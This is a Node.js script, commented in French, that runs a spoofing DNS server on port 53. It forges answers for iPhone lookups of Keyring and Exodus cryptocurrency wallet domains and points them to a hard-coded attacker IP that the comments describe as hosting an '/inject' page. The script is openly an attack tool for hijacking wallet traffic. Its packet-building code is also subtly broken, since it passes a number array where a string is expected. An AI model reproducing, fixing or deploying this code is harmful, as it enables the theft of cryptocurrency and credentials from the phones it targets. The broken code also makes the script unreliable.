const dgram = require('dgram');
const server = dgram.createSocket('udp4');

// L'IP de ton serveur Render (où se trouve la page /inject)
const FAKE_IP = '216.24.57.1'; 

server.on('message', (msg, rinfo) => {
  // On extrait le nom de domaine demandé par l'iPhone
  const domain = msg.toString('hex').substring(24);
  
  // Si l'iPhone demande l'API de Keyring ou d'Exodus
  if (msg.includes(Buffer.from('keyring')) || msg.includes(Buffer.from('exodus'))) {
    // On construit une réponse DNS qui pointe vers notre serveur Render
    const response = Buffer.from(msg);
    response.writeUInt16BE(0x8180, 2); // Flags: Standard response, no error
    response.writeUInt16BE(1, 6);      // Answer count: 1
    
    // On ajoute l'enregistrement A (IPv4)
    const answer = Buffer.alloc(16);
    answer.writeUInt16BE(0xc00c, 0);   // Pointer to domain name
    answer.writeUInt16BE(1, 2);        // Type A
    answer.writeUInt16BE(1, 4);        // Class IN
    answer.writeUInt32BE(60, 6);       // TTL
    answer.writeUInt16BE(4, 10);       // Data length
    answer.write(FAKE_IP.split('.').map(Number), 12); // L'IP
    
    const finalPacket = Buffer.concat([response, answer]);
    server.send(finalPacket, 0, finalPacket.length, rinfo.port, rinfo.address);
  } else {
    // Pour les autres domaines, on ne répond pas (le téléphone utilisera un autre DNS)
  }
});

server.bind(53, () => {
  console.log('Serveur DNS menteur en écoute sur le port 53');
});
